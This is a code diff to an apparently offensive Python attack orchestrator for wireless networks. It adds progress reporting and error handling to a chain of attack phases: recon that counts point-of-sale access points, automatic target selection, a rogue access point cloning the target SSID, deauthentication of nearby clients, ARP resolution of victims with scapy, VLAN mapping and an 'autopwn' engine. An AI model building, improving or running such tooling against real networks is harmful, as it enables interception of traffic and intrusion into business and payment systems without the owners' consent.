@@ -153,7 +153,34 @@ class AttackOrchestrator:
         self._autopwn_config = autopwn_config
         self._autopwn_engine = None
 
+        # Progress callback: called with (phase: str, detail: str, pct: int|None)
+        self._progress_callbacks = []
+
         self.running = False
+
+    def on_progress(self, callback):
+        """Register a progress callback.
+
+        The callback is invoked as callback(phase, detail, percent) where:
+          - phase: str — current attack phase name (e.g., "recon", "deauth", "rogue_ap")
+          - detail: str — human-readable description of current activity
+          - percent: int|None — completion percentage (0-100) if known, None otherwise
+
+        Multiple callbacks can be registered. They are called synchronously
+        from the orchestrator thread.
+
+        Args:
+            callback: Callable[[str, str, Optional[int]], None]
+        """
+        self._progress_callbacks.append(callback)
+
+    def _notify_progress(self, phase, detail, percent=None):
+        """Notify all registered progress callbacks."""
+        for cb in self._progress_callbacks:
+            try:
+                cb(phase, detail, percent)
+            except Exception as e:
+                log.debug(f"Progress callback error: {e}")
 
     def load_plugins(self, plugin_dirs=None):
         """
@@ -337,6 +364,7 @@ class AttackOrchestrator:
         # ── Phase 1: Passive Recon ────────────────────────────────────────────
         if self.recon_duration > 0:
             log.info(f"Phase 1: Passive recon ({self.recon_duration}s)...")
+            self._notify_progress("recon", f"Scanning for {self.recon_duration}s", 0)
             self.recon.set_signal_targeting(self.signal_filter)
 
             # Start intel enricher alongside recon for real-time data enrichment
@@ -361,6 +389,7 @@ class AttackOrchestrator:
                  f"{stats['pos_access_points']} POS APs found")
 
         # ── Phase 2: Target Selection (from scan data) ────────────────────────
+        self._notify_progress("target_selection", "Selecting best target from scan data", 25)
         if not self._auto_select_target():
             self.running = False
             return False
@@ -397,6 +426,7 @@ class AttackOrchestrator:
                  f"{len(close_clients)} within signal range (RSSI > {self.signal_rssi_limit}dBm)")
 
         # ── Phase 3: Rogue AP (uses scanned SSID + channel) ──────────────────
+        self._notify_progress("rogue_ap", f"Deploying rogue AP '{self.target_ssid}'", 40)
         # Emit attack started event
         self._event_bus.emit_sync(EventType.ATTACK_STARTED, {
             "target_bssid": self.target_bssid,
@@ -419,6 +449,7 @@ class AttackOrchestrator:
             return False
 
         # ── Phase 4: Deauth (targets scanned clients with signal filtering) ───
+        self._notify_progress("deauth", f"Deauthing {len(close_clients)} clients", 55)
         self.deauth.add_target(self.target_bssid, close_clients)
         self.deauth.start()
 
@@ -451,10 +482,13 @@ class AttackOrchestrator:
             if sample_client_mac:
                 try:
                     from scapy.all import srp, Ether, ARP
-                    # ARP who-has on the local subnet to resolve MAC -> IP
-                    # This works when we're on the same L2 segment as the client
+                    from .config import NETWORK_IP, NETWORK_MASK
+                    # Use configured network subnet for ARP resolution
+                    # Convert network/mask to CIDR for ARP scan
+                    arp_subnet = NETWORK_IP + "/24"  # Use configured NETWORK_IP
+                    # ARP who-has on the rogue AP subnet to resolve MAC -> IP
                     ans, _ = srp(
-                        Ether(dst=sample_client_mac) / ARP(pdst="10.0.0.0/24"),
+                        Ether(dst=sample_client_mac) / ARP(pdst=arp_subnet),
                         iface=self.ap_iface, timeout=2, verbose=False
                     )
                     for _, rcv in ans:
@@ -542,6 +576,7 @@ class AttackOrchestrator:
             log.info("VLAN scanning and network mapping enabled")
 
         # ── Phase 6: Background Recon (feeds new clients into deauth) ────────
+        self._notify_progress("active", "All attack modules active, monitoring...", 100)
         self.recon.running = True
         threading.Thread(target=self._background_recon, daemon=True).start()
 
@@ -631,8 +666,12 @@ class AttackOrchestrator:
             from scapy.all import raw
             sniff(iface=self.monitor_iface, prn=handler, store=0,
                   stop_filter=lambda x: not self.running)
-        except Exception:
-            pass
+        except OSError as e:
+            if self.running:
+                log.error(f"Background recon sniff failed (interface issue?): {e}")
+        except Exception as e:
+            if self.running:
+                log.warning(f"Background recon stopped unexpectedly: {e}")
 
     def _run_vlan_scan(self):
         """Run VLAN scanning and network mapping in background."""
